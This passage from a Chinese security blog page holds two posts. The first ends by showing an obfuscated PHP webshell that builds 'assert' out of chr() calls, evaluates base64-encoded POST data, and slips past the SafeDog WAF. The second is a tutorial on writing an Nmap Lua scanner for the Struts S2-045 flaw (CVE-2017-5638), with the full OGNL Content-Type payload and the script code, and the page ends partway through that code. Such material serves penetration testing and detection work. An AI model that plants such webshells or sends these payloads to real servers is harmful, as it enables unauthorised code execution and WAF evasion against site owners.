<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">101</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[e]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">114</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[r]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">116</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[t]</span>
<span class="nv">$___Ss</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFthY3Rpb25dKSk='</span><span class="p">);</span>
</code></pre></div></div>

解码后是：<code class="highlighter-rouge">$___Ss(@eval(base64_decode($_POST[action])))</code>

再次简化为：<code class="highlighter-rouge">assert(@eval(base64_decode($_POST[action])))</code>

那么现在你就应该可以明白了，我们的Cknife传出的全部都是Base64编码，从而绕过WAF对数据包敏感词汇的匹配。

<blockquote>
  个人认为Base64目前是最为方便的传输方式，因为该传输行为与开发人员极其相似，例如：图片base64传输，还有我们<code class="highlighter-rouge">Shell Code</code>中使用的参数，也是开发人员经常用到的 <code class="highlighter-rouge">username</code>
</blockquote>

此时更改好后我们去try一下 ～

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x06.png" alt="Success" />

看来已经成功了。

查看进程：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x07.png" alt="Command" />

图中选中的进程<code class="highlighter-rouge">SafeDogSiteApache.exe</code>，就是WAF了，一切都没有拦截。

<h2 id="0x04-最后的思考">0x04 最后的思考</h2>

如果想做到真正的安全，还是要深入行为查杀，当前的WAF不是很强大，基本上通过匹配数据包的内容已经无法满足防护的需求了。

因为当前的传输方式是通过正常的手法去传输的。

下一次升级可以考虑进行各种可能的解码…… 不过只是亡羊补牢的做法罢了。

最终还是要加强木马的查杀，相关文章<a href="https://zhuanlan.zhihu.com/p/27148719">脚本木马查杀原理的简单探讨</a>

由于文章比较敏感，就不在知乎发布了。 感谢阅读，微信公众号：<code class="highlighter-rouge">知安小酒馆</code> 欢迎关注 ！

我的微信：Guest_Killer_0nlis


    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Monday, June 5, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        bypass &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/nmap-write-script" > Struts S2-045 Nmap扫描脚本</a>
    </div>
    <div class="post-excerpt">
      本文介绍一下Nmap的扩展插件编写
<!--more-->
<h2 id="0x00-nmap脚本简介">0x00 Nmap脚本简介</h2>

夜无眠，看了一下Nmap官方的英文API文档(全是English)，瞬间心态崩塌，不想吐槽它们的nmap官网前端太丑了=。=，但是都是大牛啊，挺敬佩开源开发者的。

Nmap最灵活的就是它的<code class="highlighter-rouge">scripts</code>了，在渗透测试中我们经常会用它来扫描服务、漏洞，而且很多脚本也可以用于漏洞利用，总之就是很强大啦～ 具体的介绍在这里：<a href="https://zhuanlan.zhihu.com/p/26618074">Nmap脚本使用指南</a>

看过《Nmap渗透指南》一书，发现书中对于Nmap脚本的编写是轻描淡写，所以本文就利用一个漏洞实例给大家详细说说这个脚本如何开发的。
<code class="highlighter-rouge">PS：并没有说这本书不好，其实很好很好的。</code>

<h2 id="0x01-实战编写前的思路">0x01 实战编写前的思路</h2>

今天我用<code class="highlighter-rouge">Struts S2-045</code>这个漏洞来编写一个漏洞检测脚本。

PS：此文需要一点<code class="highlighter-rouge">Lua</code>语言基础。我也就看了个半调子 ，才写的这个文章，Lua大牛误喷。

思路： 它主要是给服务器端发送一个http请求，这个请求里的<code class="highlighter-rouge">Content-type</code>中就是我们的利用代码了。在这里可以称之为<code class="highlighter-rouge">Payload</code>。

相关链接：<a href="https://zhuanlan.zhihu.com/p/25639832">Struts 2 S2-045 Jakarta插件远程代码执行漏洞加固方法</a>

我们先把<code class="highlighter-rouge">Payload</code>拿出来：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('YES')).(#o.close())}
</code></pre></div></div>

可以看到有一个YES，当服务器端相应YES的时候，我们就判定这个服务器存在此漏洞。

根据官方的文档，我们先载入指定的扩展库：

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">--</span>
<span class="c1">-- Created by IntelliJ IDEA.</span>
<span class="c1">-- User: liyingzhe</span>
<span class="c1">-- Date: 17-6-3</span>
<span class="c1">-- Time: 上午2:07</span>
<span class="c1">-- To change this template use File | Settings | File Templates.</span>
<span class="c1">--</span>
<span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"http"</span>
<span class="kd">local</span> <span class="n">shortport</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"shortport"</span>
<span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"stdnse"</span>
<span class="kd">local</span> <span class="n">string</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"string"</span>
<span class="kd">local</span> <span class="n">vulns</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"vulns"</span>
</code></pre></div></div>
这些基本用于发送HTTP请求、字符串操作、漏洞结果生成、错误调试

添加一个漏洞描述 ：
<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">description</span> <span class="o">=</span> <span class="s">[[
The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
References:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
* http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474
]]</span>
</code></pre></div></div>
这里我给出了CNVD和CVE编号的详细地址。

使用结果，这块可有可无，因为都是注释起来的：
<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- @usage</span>
<span class="c1">-- nmap -sV -p- --script struts2-s2-045 &lt;target&gt;</span>
<span class="c1">-- nmap -sV -p- --script struts2-s2-045 --script-args uri=/aa.action &lt;target&gt;</span>
<span class="c1">-- @output</span>
<span class="c1">-- PORT   STATE SERVICE REASON</span>
<span class="c1">-- 80/tcp open  http    syn-ack</span>
<span class="c1">-- | struts:</span>
<span class="c1">-- |   VULNERABLE:</span>
<span class="c1">-- |   Struts S2-045</span>
<span class="c1">-- |     State: VULNERABLE (Exploitable)</span>
<span class="c1">-- |     IDs:  CVE:CVE-2017-5638</span>
<span class="c1">-- |       The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.</span>
<span class="c1">-- |</span>
<span class="c1">-- |     Disclosure date: 2017-03-07</span>
<span class="c1">-- |     References:</span>
<span class="c1">-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638</span>
<span class="c1">-- |       http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474</span>
<span class="c1">-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638</span>
<span class="c1">--</span>
<span class="c1">---</span>
</code></pre></div></div>
添加作者：
<code class="highlighter-rouge">author = {"email:payloads@aliyun.com bLog:payloads.online company:leafsec.com"}</code>
这里我给出了我的邮箱、博客，当然只是个字符串，自己想写啥就写啥。但是你要在用户的角度考虑，参数以及说明尽量人性化。
<h2 id="0x02-第一个函数-前奏">0x02 第一个函数-前奏</h2>
<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">portrule</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
    <span class="c1">-- return port.protocol == "tcp" and port.number == 8899 and port.state == "open"</span>
    <span class="k">return</span> <span class="kc">true</span>
<span class="k">end</span>
</code></pre></div></div>
这个函数主要用于“第一次检测”，算是一个规则。

<code class="highlighter-rouge">portrule</code>变量名不可改变，否则会解析错误。

当这个函数范围true的时候， 我们的漏洞检测函数才会被自动调用。

可以看到函数中有一行被注释了，这一行的意思是当前请求的协议是TCP并且端口号是8899并且是端口是打开状态，才会返回true。

如果当前函数返回false，那么漏洞检测函数就不会被调用，会继续下一个目标或端口的扫描。

当我们直接返回true，那么每个目标端口都会被传递给漏洞检测函数。

听我说了这么多，漏洞检测函数到底是什么？

<h2 id="0x03-第二个函数-高潮">0x03 第二个函数-高潮</h2>

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
  <span class="kd">local</span> <span class="n">useragent</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="o">..</span><span class="s2">".useragent"</span><span class="p">)</span> <span class="ow">or</span> <span class="kc">nil</span>
  <span class="kd">local</span> <span class="n">cookie</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="o">..</span><span class="s2">".cookie"</span><span class="p">)</span> <span class="ow">or</span> <span class="kc">nil</span>
  <span class="kd">local</span> <span class="n">referer</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="o">..</span><span class="s2">".referer"</span><span class="p">)</span> <span class="ow">or</span> <span class="kc">nil</span>
  <span class="kd">local</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="o">..</span><span class="s2">".uri"</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">'/'</span>
  <span class="kd">local</span> <span class="n">req</span> <span class="o">=</span> <span class="n">generate_http_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span><span class="n">useragent</span><span class="p">,</span><span class="n">cookie</span><span class="p">,</span><span class="n">referer</span><span class="p">)</span>
  <span class="k">if</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">,</span> <span class="s1">'YES'</span><span class="p">)</span> <span class="k">then</span>
    <span class="kd">local</span> <span class="n">vuln_report</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">Report</span><span class="p">:</span><span class="n">new</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">vuln</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">title</span> <span class="o">=</span> <span class="s1">'Struts S2-045'</span><span class="p">,</span>
      <span class="n">state</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">STATE</span><span class="p">.</span><span class="n">VULN</span><span class="p">,</span>
      <span class="n">description</span> <span class="o">=</span> <span class="s">[[
The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
      ]]</span><span class="p">,</span>
      <span class="n">IDS</span> <span class="o">=</span> <span class="p">{</span><span class="n">CVE</span> <span class="o">=</span> <span class="s1">'CVE-2017-5638'</span><span class="p">},</span>
      <span class="n">references</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638'</span><span class="p">,</span>
        <span class="s1">'http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474'</span>
      <span class="p">},</span>
      <span class="n">dates</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">disclosure</span> <span class="o">=</span> <span class="p">{</span><span class="n">year</span> <span class="o">=</span> <span class="s1">'2017'</span><span class="p">,</span> <span class="n">month</span> <span class="o">=</span> <span class="s1">'03'</span><span class="p">,</span> <span class="n">day</span> <span class="o">=</span> <span class="s1">'07'</span><span class="p">},</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">stdnse</span><span class="p">.</span><span class="n">debug1</span><span class="p">(</span><span class="s2">"There is a vulnerability in the current host"</span><span class="p">)</span>
    <span class="n">vuln</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">STATE</span><span class="p">.</span><span class="n">EXPLOIT</span>
    <span class="k">return</span> <span class="n">vuln_report</span><span class="p">:</span><span class="n">make_output</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>
第二个函数就是<code class="highlighter-rouge">action</code>啦～
<code class="highlighter-rouge">stdnse.get_script_args(SCRIPT_NAME..".useragent") or nil</code>
stdnse用于处理用户的输入，这里调用了get_script_args用来接收用户输入的useragent参数值。
接下来我调用了一个自定义函数：

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">function</span> <span class="nf">generate_http_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">useragent</span><span class="p">,</span><span class="n">cookie</span><span class="p">,</span><span class="n">referer</span><span class="p">)</span>
  <span class="kd">local</span> <span class="n">payload</span> <span class="o">=</span> <span class="s1">'%{(#nikenb=\'</span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="err">\</span><span class="s1">').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(\'</span><span class="n">YES</span><span class="err">\</span><span class="s1">')).(#o.close())}'</span>
  <span class="kd">local</span> <span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="n">header</span><span class="o">=</span><span class="p">{}}</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"no_cache"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"header"</span><span class="p">][</span><span class="s2">"User-Agent"</span><span class="p">]</span> <span class="o">=</span> <span class="n">useragent</span> <span class="ow">or</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0'</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"header"</span><span class="p">][</span><span class="s2">"Referer"</span><span class="p">]</span> <span class="o">=</span> <span class="n">referer</span> <span class="ow">or</span> <span class="s1">'NULL'</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"cookies"</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span> <span class="ow">or</span> <span class="s1">'NULL'</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"header"</span><span class="p">][</span><span class="s2">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
  <span class="n">stdnse</span><span class="p">.</span><span class="n">debug1</span><span class="p">(</span><span class="s2">"Start scanning the vulnerability"</span><span class="p">)</span>
  <span class="kd">local</span> <span class="n">req</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">options</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">req</span>
<span class="k">end</span>
</code></pre></div></div>

这里面有我们的Payload，然后装填<code class="highlighter-rouge">User-Agent、Referer、Cookies、Content-Type、uri</code>地址。

<code class="highlighter-rouge">stdnse.debug1()</code>这个函数用于输出调试信息，如果你要查看调试信息，那就在扫描的时候带上-d参数

最后我们用了http库中的get方法，发送了一个请求，返回一个结果对象。

是不是和Python差不多呢？ :)
<blockquote>
  获取了结果对象我们就可以进行内容匹配了，如果在内容中寻找到我们的“YES”，那么就存在漏洞。
  <div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">,</span> <span class="s1">'YES'</span><span class="p">)</span> <span class="k">then</span>
    <span class="kd">local</span> <span class="n">vuln_report</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">Report</span><span class="p">:</span><span class="n">new</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">vuln</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">title</span> <span class="o">=</span> <span class="s1">'Struts S2-045'</span><span class="p">,</span>
      <span class="n">state</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">STATE</span><span class="p">.</span><span class="n">VULN</span><span class="p">,</span>
      <span class="n">description</span> <span class="o">=</span> <span class="s">[[
The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
      ]]</span><span class="p">,</span>
      <span class="n">IDS</span> <span class="o">=</span> <span class="p">{</span><span class="n">CVE</span> <span class="o">=</span> <span class="s1">'CVE-2017-5638'</span><span class="p">},</span>
      <span class="n">references</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638'</span><span class="p">,</span>
        <span class="s1">'http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474'</span>
      <span class="p">},</span>
      <span class="n">dates</span> <span class="o">=</span> <span class="p">{</span>
        <span class="n">disclosure</span> <span class="o">=</span> <span class="p">{</span><span class="n">year</span> <span class="o">=</span> <span class="s1">'2017'</span><span class="p">,</span> <span class="n">month</span> <span class="o">=</span> <span class="s1">'03'</span><span class="p">,</span> <span class="n">day</span> <span class="o">=</span> <span class="s1">'07'</span><span class="p">},</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">stdnse</span><span class="p">.</span><span class="n">debug1</span><span class="p">(</span><span class="s2">"There is a vulnerability in the current host"</span><span class="p">)</span>
    <span class="n">vuln</span><span class="p">.</span><span class="n">state</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">STATE</span><span class="p">.</span><span class="n">EXPLOIT</span>
    <span class="k">return</span> <span class="n">vuln_report</span><span class="p">:</span><span class="n">make_output</span><span class="p">(</span><span class="n">vuln</span><span class="p">)</span>
  <span class="k">end</span>
</code></pre></div>  </div>
  这块就是做了一个字符串匹配，难点在于产生漏洞结果。
  <div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">vuln</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">title</span> <span class="o">=</span> <span class="s1">'Struts S2-045'</span><span class="p">,</span>
      <span class="n">state</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">STATE</span><span class="p">.</span><span class="n">VULN</span><span class="p">,</span>
</code></pre></div>  </div>
  这个vuln的state属性就用来标识是否存在漏洞的。
</blockquote>

如果存在漏洞，就赋值<code class="highlighter-rouge">vulns.STATE.VULN</code>，如果不存在，就赋值<code class="highlighter-rouge">vulns.STATE.NOT_VULN</code>
<h2 id="0x04-总结">0x04 总结</h2>
具体可以多看看那些漏洞利用脚本，因为官方文档真的是不够全面，需要比较深的Lua功底才可以玩的666。
下面贴出完整代码：
<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">--</span>
<span class="c1">-- Created by IntelliJ IDEA.</span>
<span class="c1">-- User: liyingzhe</span>
<span class="c1">-- Date: 17-6-3</span>
<span class="c1">-- Time: 上午2:07</span>
<span class="c1">-- To change this template use File | Settings | File Templates.</span>
<span class="c1">--</span>
<span class="kd">local</span> <span class="n">http</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"http"</span>
<span class="kd">local</span> <span class="n">shortport</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"shortport"</span>
<span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"stdnse"</span>
<span class="kd">local</span> <span class="n">string</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"string"</span>
<span class="kd">local</span> <span class="n">vulns</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"vulns"</span>

<span class="n">description</span> <span class="o">=</span> <span class="s">[[
The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
References:
* http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
* http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474
]]</span>

<span class="c1">-- @usage</span>
<span class="c1">-- nmap -sV -p- --script struts2-s2-045 &lt;target&gt;</span>
<span class="c1">-- nmap -sV -p- --script struts2-s2-045 --script-args uri=/aa.action &lt;target&gt;</span>
<span class="c1">-- @output</span>
<span class="c1">-- PORT   STATE SERVICE REASON</span>
<span class="c1">-- 80/tcp open  http    syn-ack</span>
<span class="c1">-- | struts:</span>
<span class="c1">-- |   VULNERABLE:</span>
<span class="c1">-- |   Struts S2-045</span>
<span class="c1">-- |     State: VULNERABLE (Exploitable)</span>
<span class="c1">-- |     IDs:  CVE:CVE-2017-5638</span>
<span class="c1">-- |       The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.</span>
<span class="c1">-- |</span>
<span class="c1">-- |     Disclosure date: 2017-03-07</span>
<span class="c1">-- |     References:</span>
<span class="c1">-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638</span>
<span class="c1">-- |       http://www.cnvd.org.cn/flaw/show/CNVD-2017-02474</span>
<span class="c1">-- |_      http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638</span>
<span class="c1">--</span>
<span class="c1">---</span>
<span class="n">author</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"email:payloads@aliyun.com bLog:payloads.online company:leafsec.com"</span><span class="p">}</span>
<span class="n">license</span> <span class="o">=</span> <span class="s2">"Same as Nmap--See https://nmap.org/book/man-legal.html"</span>
<span class="c1">-- categories = {"exploit","vuln","intrusive"}</span>
<span class="c1">-- portrule = shortport.http</span>
<span class="n">portrule</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
    <span class="c1">-- return port.protocol == "tcp" and port.number == 8899 and port.state == "open"</span>
    <span class="k">return</span> <span class="kc">true</span>
<span class="k">end</span>
<span class="k">function</span> <span class="nf">generate_http_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">useragent</span><span class="p">,</span><span class="n">cookie</span><span class="p">,</span><span class="n">referer</span><span class="p">)</span>
  <span class="kd">local</span> <span class="n">payload</span> <span class="o">=</span> <span class="s1">'%{(#nikenb=\'</span><span class="n">multipart</span><span class="o">/</span><span class="n">form</span><span class="o">-</span><span class="n">data</span><span class="err">\</span><span class="s1">').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println(\'</span><span class="n">YES</span><span class="err">\</span><span class="s1">')).(#o.close())}'</span>
  <span class="kd">local</span> <span class="n">options</span> <span class="o">=</span> <span class="p">{</span><span class="n">header</span><span class="o">=</span><span class="p">{}}</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"no_cache"</span><span class="p">]</span> <span class="o">=</span> <span class="kc">true</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"header"</span><span class="p">][</span><span class="s2">"User-Agent"</span><span class="p">]</span> <span class="o">=</span> <span class="n">useragent</span> <span class="ow">or</span> <span class="s1">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0'</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"header"</span><span class="p">][</span><span class="s2">"Referer"</span><span class="p">]</span> <span class="o">=</span> <span class="n">referer</span> <span class="ow">or</span> <span class="s1">'NULL'</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"cookies"</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span> <span class="ow">or</span> <span class="s1">'NULL'</span>
  <span class="n">options</span><span class="p">[</span><span class="s2">"header"</span><span class="p">][</span><span class="s2">"Content-Type"</span><span class="p">]</span> <span class="o">=</span> <span class="n">payload</span>
  <span class="n">stdnse</span><span class="p">.</span><span class="n">debug1</span><span class="p">(</span><span class="s2">"Start scanning the vulnerability"</span><span class="p">)</span>
  <span class="kd">local</span> <span class="n">req</span> <span class="o">=</span> <span class="n">http</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">options</span><span class="p">)</span>
  <span class="k">return</span> <span class="n">req</span>
<span class="k">end</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
  <span class="kd">local</span> <span class="n">useragent</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="o">..</span><span class="s2">".useragent"</span><span class="p">)</span> <span class="ow">or</span> <span class="kc">nil</span>
  <span class="kd">local</span> <span class="n">cookie</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="o">..</span><span class="s2">".cookie"</span><span class="p">)</span> <span class="ow">or</span> <span class="kc">nil</span>
  <span class="kd">local</span> <span class="n">referer</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="o">..</span><span class="s2">".referer"</span><span class="p">)</span> <span class="ow">or</span> <span class="kc">nil</span>
  <span class="kd">local</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="o">..</span><span class="s2">".uri"</span><span class="p">)</span> <span class="ow">or</span> <span class="s1">'/'</span>
  <span class="kd">local</span> <span class="n">req</span> <span class="o">=</span> <span class="n">generate_http_req</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span><span class="n">useragent</span><span class="p">,</span><span class="n">cookie</span><span class="p">,</span><span class="n">referer</span><span class="p">)</span>
  <span class="k">if</span> <span class="nb">string.match</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">body</span><span class="p">,</span> <span class="s1">'YES'</span><span class="p">)</span> <span class="k">then</span>
    <span class="kd">local</span> <span class="n">vuln_report</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">Report</span><span class="p">:</span><span class="n">new</span><span class="p">(</span><span class="n">SCRIPT_NAME</span><span class="p">,</span> <span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">vuln</span> <span class="o">=</span> <span class="p">{</span>
      <span class="n">title</span> <span class="o">=</span> <span class="s1">'Struts S2-045'</span><span class="p">,</span>
      <span class="n">state</span> <span class="o">=</span> <span class="n">vulns</span><span class="p">.</span><span class="n">STATE</span><span class="p">.</span><span class="n">VULN</span><span class="p">,</span>
      <span class="n">description</span> <span class="o">=</span> <span class="s">[[
The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and 2.5.x before 2.5.10.1 mishandles file upload, which allows remote attackers to execute arbitrary commands via a #cmd= string in a crafted Content-Type HTTP header, as exploited in the wild in March 2017.
      ]]</span><span class="p">,</span>
